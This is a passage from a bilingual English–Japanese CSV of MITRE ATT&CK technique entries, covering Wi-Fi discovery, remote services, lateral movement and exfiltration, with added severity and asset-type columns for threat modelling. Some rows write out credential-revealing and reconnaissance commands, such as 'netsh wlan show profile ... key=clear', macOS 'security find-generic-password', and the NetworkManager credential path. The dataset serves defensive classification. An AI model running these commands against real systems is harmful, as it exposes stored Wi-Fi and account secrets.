macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)",攻撃者は侵害されたシステム上で、ネットワーク名やパスワードなどのWi-Fiネットワーク情報を検索する可能性があります。攻撃者はWi-Fi情報を、[アカウント発見](https://attack.mitre.org/techniques/T1087)、 [リモートシステム検出](https://attack.mitre.org/techniques/T1018)、その他の検出活動や[認証情報取得](https://attack.mitre.org/tactics/TA0006)活動の一環として、現在進行中および将来の攻撃キャンペーンを支援するために使用される可能性があります。攻撃者はホストからWi-Fiネットワークに関する様々な情報を収集する可能性があります。 例えばWindowsでは、`netsh wlan show profiles`でWi-Fiネットワーク名を列挙し、`netsh wlan show profile “Wi-Fi名 Ekey=clear`で対応するパスワードを表示することで、デバイスが過去に接続した全Wi-Fiネットワークの名称とパスワードを入手可能です。(引用元: BleepingComputer Agent Tesla steal wifi passwords)(引用元: Malware Bytes New AgentTesla variant steals WiFi credentials)(引用元: Check Point APT35 CharmPower January 2022) さらに、`wlanAPI.dll` [ネイティブAPI](https://attack.mitre.org/techniques/T1106) 関数への呼び出しにより、ローカルで到達可能なWi-Fiネットワークの名前やその他の詳細情報を検出することが可能です。(引用元: Binary Defense Emotes Wi-Fi Spreader) Linuxでは、デバイスが過去に接続した全Wi-Fiネットワークの名前とパスワードが`/etc/NetworkManager/system-connections/`配下のファイルに保存されている可能性があります。(引用元: Wi-Fi Password of All Connected Networks in Windows/Linux) macOSでは、既知のWi-Fiのパスワードを`security find-generic-password -wa wifiname`で特定できる場合があります（管理者ユーザー名/パスワードが必要）。(引用元: Find Wi-Fi Password on Mac),discovery,Linux;Windows;macOS,credential_abuse,situational_awareness,authentication_system;user_interaction;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM);Wireless Access Point,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--494ab9f0-36e0-4b06-b10d-57285b040a06,2023-09-08T15:39:50.269Z,2025-04-15T23:21:00.705Z,,,,
T1017,,Application Deployment Software,アプリケーション展開ソフトウェア,"Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.",攻撃者は、企業管理者が使用するアプリケーション展開システムを利用して、ネットワーク内のシステムに悪意のあるソフトウェアを展開する可能性があります。この操作に必要な権限はシステム構成によって異なります。展開サーバーへの直接アクセスにはローカル認証情報で十分な場合もあれば、特定のドメイン認証情報が必要な場合もあります。ただし、システムへのログインやソフトウェア展開には管理者アカウントが必要な場合があります。 ネットワーク全体または企業全体のソフトウェア展開システムへのアクセスにより、攻撃者は当該システムに接続された全システム上でリモートコード実行が可能となります。このアクセスは、システム間横移動、情報収集、または全エンドポイントのハードドライブ消去といった特定の効果を引き起こすために悪用される可能性があります。,lateral-movement,Linux;macOS;Windows,credential_abuse,boundary_crossing,authentication_system;privileged_account;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61,2017-05-31T21:30:27.755Z,2025-04-25T15:15:21.467Z,,,,
T1018,,Remote System Discovery,リモートシステム検出,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`. Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment. Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)",攻撃者は、現在のシステムからの横方向移動に利用可能なネットワーク上の他のシステムを、IPアドレス、ホスト名、その他の論理識別子でリスト化しようとする可能性があります。リモートアクセスツール内にこの機能を実装している場合もありますが、オペレーティングシステム上で利用可能なユーティリティ（例：[Ping](https://attack.mitre.org/software/S0097)、 <code>net view</code>（[Net](https://attack.mitre.org/software/S0039)使用）、ESXiサーバーでは`esxcli network diag ping`など。攻撃者はローカルホストファイル（例：<code>C:\Windows\System32\Drivers\etc\hosts</code> や <code>/etc/hosts</code>）やその他の受動的手段（ローカルの [Arp](https://attack.mitre.org/software/S0099) キャッシュエントリなど）からデータを分析し、環境内のリモートシステムの存在を発見しようとする可能性があります。 攻撃者はネットワークインフラの発見を標的とするほか、ネットワーク機器上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを悪用し、ネットワーク内のシステムに関する詳細情報を収集する場合があります（例：<code>show cdp neighbors</code>、<code>show arp</code>）。(引用元: US-CERT-TA18-106A)(引用元: CISA AR21-126A FIVEHANDS 2021年5月),discovery,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,situational_awareness,endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735,2017-05-31T21:30:28.187Z,2025-04-15T19:59:15.859Z,,,,
T1019,,System Firmware,システムファームウェア,"The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI) System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",BIOS（基本入出力システム）および統一拡張ファームウェアインターフェース（UEFI）または拡張ファームウェアインターフェース（EFI）は、コンピュータのオペレーティングシステムとハードウェア間のソフトウェアインターフェースとして動作するシステムファームウェアの例です。 (引用元: Wikipedia BIOS) (引用元: Wikipedia UEFI) (引用元: About UEFI) BIOS や (U)EFI などのシステムファームウェアは、コンピュータの機能の基盤となるものであり、悪意のある活動を行う、あるいはそれを支援するために、敵対者によって改変される可能性があります。システムファームウェアを上書きする機能が存在するため、高度な敵対者は、検出が困難なシステムへの永続的な手段として、悪意のあるファームウェアの更新をインストールする手段を得ることになります。,persistence,Windows,other,foothold,,unknown,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--6856ddd6-2df3-4379-8b87-284603c189c3,2017-05-31T21:30:28.613Z,2025-04-25T15:15:39.498Z,,,,
T1020,,Automated Exfiltration,自動化されたデータ流出,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",攻撃者は、収集段階で取得した機密文書などのデータを、自動処理を用いて外部に流出させる可能性がある。(引用元: ESET Gamaredon June 2020) 自動化された情報漏洩が使用される場合、情報をネットワーク外に転送するために、[C2チャネル経由の情報漏洩](https://attack.mitre.org/techniques/T1041) や [代替プロトコル経由の情報漏洩](https://attack.mitre.org/techniques/T1048) などの他の情報漏洩手法も併用される可能性が高い。,exfiltration,Linux;macOS;Windows;Network Devices,data_collection,data_outflow,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9,2017-05-31T21:30:29.458Z,2025-04-15T19:58:42.569Z,,,,
T1020.001,T1020,Traffic Duplication,トラフィック複製,"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring) Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",攻撃者は、侵害されたインフラストラクチャを介したデータ漏洩を自動化するために、トラフィックミラーリングを活用する可能性がある。 トラフィックミラーリングは、ネットワーク分析のために使用される、一部のデバイスに組み込まれた機能である。例えば、デバイスは、ネットワークアナライザやその他の監視デバイスによる分析のために、ネットワークトラフィックを 1 つ以上の宛先に転送するように設定されることがある。(引用: Cisco Traffic Mirroring)(引用: Juniper Traffic Mirroring) 敵対者は、トラフィックミラーリングを悪用して、ネットワークトラフィックをミラーリングしたり、彼らが制御する他のインフラストラクチャにリダイレクトしたりする可能性がある。 ネットワークデバイスへの悪意ある改変によるトラフィック転送の実現は、[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)や[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を通じて可能となる場合があります。(引用元: US-CERT-TA18-106A)(引用元: Cisco Blog Legacy Device Attacks) 多くのクラウドベース環境もトラフィックミラーリングをサポートしている。例えば、AWSトラフィックミラーリング、GCPパケットミラーリング、Azure vTapでは、トラフィック収集元の指定インスタンスと収集トラフィック送信先の指定ターゲットをユーザーが定義できる。(引用元: AWS Traffic Mirroring)(引用元: GCP Packet Mirroring)(引用元: Azure Virtual Network TAP) 攻撃者はトラフィック複製を[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)、 [入力キャプチャ](https://attack.mitre.org/techniques/T1056)、あるいは[中間者攻撃](https://attack.mitre.org/techniques/T1557)と組み合わせて使用することがあります。,exfiltration,Network Devices;IaaS,data_collection,data_outflow,user_interaction;network_connectivity;cloud_control_plane;logging_monitoring,specified,File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1,2020-10-19T13:40:11.118Z,2025-04-15T19:58:44.474Z,,,,
T1021,,Remote Services,リモートサービス,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user. In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter. Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)","攻撃者は、telnet、SSH、VNCなどのリモート接続を受け付けるサービスに[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用してログインする可能性があります。攻撃者はその後、ログインしたユーザーとして操作を実行します。 企業環境では、サーバーやワークステーションはドメインに組織化されることがある。ドメインは集中型ID管理を提供し、ユーザーがネットワーク全体で単一の認証情報を使用してログインできるようにする。攻撃者が有効なドメイン認証情報を入手できれば、セキュアシェル（SSH）やリモートデスクトッププロトコル（RDP）などのリモートアクセスプロトコルを使用して、多くの異なるマシンにログインできる可能性がある。(引用: SSH Secure Shell)(引用: TechNet Remote Desktop Services) また、ドメインにアイデンティティをフェデレーションするSaaSやIaaSサービス、VMware vCenterなどの内部仮想化環境管理プラットフォームにもアクセス可能になります。 正当なアプリケーション（[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)やその他の管理プログラムなど）は、リモートホストへのアクセスに[リモートサービス](https://attack.mitre.org/techniques/T1021)を利用する場合があります。例えば、macOS上のApple Remote Desktop（ARD）は、リモート管理に使用されるネイティブソフトウェアです。 ARDは、画面と制御バッファの送信に[VNC](https://attack.mitre.org/techniques/T1021/005)、安全なファイル転送に[SSH](https://attack.mitre.org/techniques/T1021/004)など、複数のプロトコルを組み合わせて利用します。(引用元: Remote Management MDM macOS)(引用元: Kickstart Apple Remote Desktop commands)(引用元: Apple Remote Desktop Admin Guide 3.3)攻撃者は ARD などのアプリケーションを悪用して、リモートコード実行や横方向の移動を行う可能性があります。 macOS 10.14 以前のバージョンでは、攻撃者は SSH セッションを ARD セッションにエスカレートすることができ、これにより攻撃者はユーザーの操作なしに TCC (Transparency, Consent, and Control) プロンプトを受け入れ、データへのアクセス権を取得することができます。(引用: FireEye 2019 Apple Remote Desktop)(引用: Lockboxx ARD 2019)(引用: Kickstart Apple Remote Desktop commands)",lateral-movement,Linux;macOS;Windows;IaaS;ESXi,credential_abuse,boundary_crossing,authentication_system;identity_federation;user_interaction;endpoint_execution;endpoint_management;network_connectivity;saas_in_use;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba,2017-05-31T21:30:29.858Z,2025-04-15T19:58:32.234Z,,,,
T1021.001,T1021,Remote Desktop Protocol,リモートデスクトッププロトコル,Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware),攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して、リモートデスクトッププロトコル（RDP）経由でコンピュータにログインする可能性があります。攻撃者はその後、ログインしたユーザーとして操作を実行できます。リモートデスクトップはオペレーティングシステムに共通する機能であり、ユーザーがリモートシステムのグラフィカルユーザーインターフェース（GUI）上で対話型セッションにログインすることを可能にします。 Microsoftは、リモートデスクトッププロトコル（RDP）の実装をリモートデスクトップサービス（RDS）と呼んでいます。（引用元：TechNet Remote Desktop Services）サービスが有効化され、既知の認証情報を持つアカウントへのアクセスが許可されている場合、攻撃者はRDP/RDSを介してリモートシステムに接続し、アクセス権を拡大する可能性があります。攻撃者は、RDPで使用する認証情報を取得するために、認証情報アクセス技術を利用する可能性が高いです。 攻撃者はまた、持続性確保のために[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)や[ターミナルサービスDLL](https://attack.mitre.org/techniques/T1505/005)と組み合わせてRDPを利用する場合がある。(出典: Alperovitch Malware),lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;user_interaction;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf,2020-02-11T18:23:26.059Z,2025-04-15T19:59:18.689Z,,,,
T1021.002,T1021,SMB/Windows Admin Shares,SMB/Windows管理者共有,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user. SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba. Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を利用して、サーバーメッセージブロック（SMB）経由でリモートネットワーク共有とやり取りを行う可能性があります。これにより攻撃者は、ログオン中のユーザーとして動作を実行できます。SMBは、同一ネットワークまたはドメイン上のWindowsマシン向けファイル・プリンター・シリアルポート共有プロトコルです。 攻撃者はSMBを利用してファイル共有とやり取りし、ネットワーク内を横方向に移動することが可能となる。LinuxおよびmacOSにおけるSMBの実装は通常Sambaを使用する。Windowsシステムには管理者だけがアクセス可能な隠しネットワーク共有が存在し、リモートファイルコピーやその他の管理機能を提供する。例として`C$`、`ADMIN$`、`IPC$`などのネットワーク共有が挙げられる。 攻撃者はこの手法を管理者レベルの[有効なアカウント](https://attack.mitre.org/techniques/T1078)と組み合わせて、SMB経由でネットワークシステムにリモートアクセスし、(引用元: Wikipedia Server Message Block)リモートプロシージャコール(RPC)を用いてシステムとやり取りし、(引用元: TechNet RPC)ファイルを転送し、転送されたバイナリをリモート実行で実行する可能性があります。 SMB/RPC経由の認証済みセッションに依存する実行手法の例としては、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、 [サービス実行](https://attack.mitre.org/techniques/T1569/002)、および[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)です。 攻撃者はNTLMハッシュを悪用し、[Pass the Hash](https://attack.mitre.org/techniques/T1550/002)手法や特定の構成・パッチレベルが適用されたシステム上の管理者共有リソースにもアクセス可能です。（引用元: Microsoft Admin Shares）,lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541,2020-02-11T18:25:28.212Z,2025-04-15T19:58:29.701Z,,,,
T1021.003,T1021,Distributed Component Object Model,分散コンポーネントオブジェクトモデル,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user. The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM) Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL) Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)",攻撃者は、分散コンポーネントオブジェクトモデル（DCOM）を悪用し、[有効なアカウント](https://attack.mitre.org/techniques/T1078) を使用してリモートマシンとやり取りする可能性があります。攻撃者はその後、ログオンしているユーザーとして操作を実行する可能性があります。 Windowsコンポーネントオブジェクトモデル（COM）は、ネイティブWindowsアプリケーションプログラミングインターフェース（API）の構成要素であり、ソフトウェアオブジェクト間、あるいは1つ以上のインターフェースを実装する実行可能コード間の相互作用を可能にします。COMを通じて、クライアントオブジェクトはサーバーオブジェクト（通常はダイナミックリンクライブラリ（DLL）または実行可能ファイル（EXE））のメソッドを呼び出すことができます。 分散COM（DCOM）は、リモートプロシージャコール（RPC）技術を用いてローカルコンピュータの枠を超えてCOMの機能を拡張する透過的なミドルウェアである。(引用元: Fireeye Hunting COM 2019年6月)(引用元: Microsoft COM) ローカルおよびリモートサーバーのCOMオブジェクトとの相互作用に関する権限は、レジストリ内のアクセス制御リスト（ACL）によって指定される。(引用元: Microsoft Process Wide Com Keys) デフォルトでは、管理者権限を持つユーザーのみがDCOM経由でリモートからCOMオブジェクトを起動・実行できます。(引用元: Microsoft COM ACL) DCOMを介して、適切な特権を持つユーザーのコンテキストで動作する攻撃者は、Officeアプリケーション(引用元: Enigma Outlook DCOM Lateral Movement Nov 2017)や、安全でないメソッドを含むその他のWindowsオブジェクトを通じて、リモートから任意の操作を実行したり、シェルコードを直接実行したりすることが可能です。(引用元: Enigma MMC20 COM Jan 2017)(引用元: Enigma DCOM Lateral Movement Jan 2017) DCOM は既存文書内のマクロも実行可能であり(引用元: Enigma Excel DCOM 2017年9月) を実行可能であり、さらにMicrosoft OfficeアプリケーションのCOM経由で作成されたインスタンスを介して[動的データ交換](https://attack.mitre.org/techniques/T1559/002) (DDE)を直接呼び出すこともできる（引用元：Cyberreason DCOM DDE Lateral Movement 2017年11月）。これにより悪意のある文書を必要とせずに攻撃が可能となる。 DCOMは[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)と遠隔でやり取りする方法として使用できる。（引用元: MSDN WMI）,lateral-movement,Windows,script_command_execution,boundary_crossing,privileged_account;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd,2020-02-11T18:26:36.444Z,2025-04-15T22:20:51.024Z,,,,
T1021.004,T1021,SSH,SSH,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user. SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を利用してSecure Shell（SSH）経由でリモートマシンにログインする可能性があります。攻撃者はログインしたユーザーとして操作を実行できます。SSHは認証済みユーザーが他コンピュータ上でリモートシェルを開くことを可能にするプロトコルです。多くのLinuxおよびmacOSバージョンではSSHがデフォルトでインストールされていますが、通常はユーザーが有効化するまで無効化されています。 ESXiでは、SSHはホスト上で直接（例：`vim-cmd hostsvc/enable_ssh`経由）またはvCenter経由で有効化できます。(引用元: Sygnia ESXi Ransomware 2025)(引用元: TrendMicro ESXI Ransomware)(引用元: Sygnia Abyss Locker 2025) SSHサーバーは、標準的なパスワード認証を使用するか、パスワードの代わりに、またはパスワードに加えて公開鍵・秘密鍵ペアを使用するように設定できます。 この認証シナリオでは、ユーザーの公開鍵は、そのユーザーとしてログインを許可される鍵ペアをリストアップした、サーバーを実行しているコンピュータ上の特別なファイル（すなわち、[SSH 認証済み鍵](https://attack.mitre.org/techniques/T1098/004)）に存在する必要があります。,lateral-movement,Linux;macOS;ESXi,credential_abuse,boundary_crossing,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6,2020-02-11T18:27:15.774Z,2025-04-15T19:58:17.607Z,,,,
T1021.005,T1021,VNC,VNC,"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC). VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer E protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol) VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication) Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",攻撃者は、仮想ネットワークコンピューティング（VNC）を使用して、[有効なアカウント](https://attack.mitre.org/techniques/T1078) を利用してマシンをリモート制御する可能性があります。 VNC は、RFB（「リモートフレームバッファプロトコル」）を使用して、画面、マウス、キーボード入力をネットワーク経由で中継することにより、ユーザーが別のコンピュータのディスプレイをリモートで制御できるようにする、プラットフォームに依存しないデスクトップ共有システムです。(引用: リモートフレームバッファプロトコル) VNC は、リソース共有ソフトウェアではなく画面共有ソフトウェアである点で、[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001) とは異なります。デフォルトでは、VNC はシステムの認証を使用しますが、VNC 専用の認証情報を使用するように設定することもできます。(引用: MacOS VNC software for Remote Desktop)(引用: VNC Authentication) 攻撃者はVNCを悪用し、ログインユーザーとして文書を開いたり、ファイルをダウンロードしたり、任意のコマンドを実行するなどの悪意ある行動を実行できる。攻撃者はVNCを使用してシステムを遠隔操作・監視し、データや情報を収集してネットワーク内の他のシステムへ展開する足掛かりとすることが可能である。 特定のVNCライブラリ/実装は、ブルートフォース攻撃やメモリ使用量の悪用にも脆弱でした。(引用: Hijacking VNC)(引用: macOS root VNC login without authentication)(引用: VNC Vulnerabilities)(引用: Offensive Security VNC Authentication Check)(引用: Attacking VNC Servers PentestLab)(引用: Havana authentication 